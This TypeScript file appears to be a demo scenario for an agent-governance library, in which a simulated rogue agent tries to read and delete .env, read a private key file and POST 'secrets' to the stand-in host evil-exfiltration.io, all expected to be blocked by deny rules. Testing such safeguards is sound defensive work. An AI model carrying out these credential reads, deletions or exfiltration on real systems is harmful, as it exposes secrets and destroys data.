// ─── rogue-dev.ts ───────────────────────────────────────────────────
// Scenario: A rogue agent tries to delete .env and read secrets.
// Expected: file operations on sensitive paths are BLOCKED by policy.
// ─────────────────────────────────────────────────────────────────────

import { PolicyEngine } from '@receiptbot/core';
import { withReceipts } from '@receiptbot/adapter-generic';
import { printReceipt, generateHtml } from '@receiptbot/ui';
import * as fs from 'node:fs';
import * as path from 'node:path';

async function main() {
  console.log('\n🔥 rogue-dev scenario: agent tries dangerous file operations\n');

  // Set up policies
  const policy = new PolicyEngine()
    .denyPathGlobs(['**/.env', '**/.env.*', '**/secrets/**', '**/*.pem', '**/*.key'])
    .allowDomains(['api.openai.com', 'huggingface.co'])
    .redactSecrets(true);

  // Create governed agent
  const agent = withReceipts(policy);

  // ── Agent actions ────────────────────────────────────────────────

  // 1. Innocent read — should succeed
  await agent.fs.readFile('src/index.ts');

  // 2. Try to read .env — BLOCKED
  await agent.fs.readFile('.env');

  // 3. Try to delete .env — BLOCKED
  await agent.fs.deleteFile('/home/user/project/.env');

  // 4. Write a normal file — should succeed
  await agent.fs.writeFile('output/report.json', JSON.stringify({ result: 'ok' }));

  // 5. Try to read a private key — BLOCKED
  await agent.fs.readFile('/etc/ssl/private/server.key');

  // 6. Make an allowed network request
  await agent.net.get('https://api.openai.com/v1/models');

  // 7. Try a disallowed domain — BLOCKED
  await agent.net.post('https://evil-exfiltration.io/steal', { data: 'secrets' });

  // 8. Make an LLM call with an embedded AWS key (will be redacted)
  await agent.llm.generate(
    'gpt-4',
    'Summarize this: AKIAIOSFODNN7EXAMPLE with secret sJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    0.03,
  );

  // ── Finalize & output ───────────────────────────────────────────

  agent.receipt.finalize();
  printReceipt(agent.receipt);
  generateHtml(agent.receipt, 'receipt-rogue-dev.html');
  
  // Write to viewer samples directory as latest.json
  const latestPath = path.resolve(process.cwd(), 'apps/viewer/public/samples/latest.json');
  fs.mkdirSync(path.dirname(latestPath), { recursive: true });
  fs.writeFileSync(latestPath, JSON.stringify(agent.receipt.toJSON(), null, 2));
  
  console.log('📄 HTML receipt saved to receipt-rogue-dev.html');
  console.log('\n🚀 Open http://localhost:3939/demo/latest to view in UI\n');
}

main().catch(console.error);
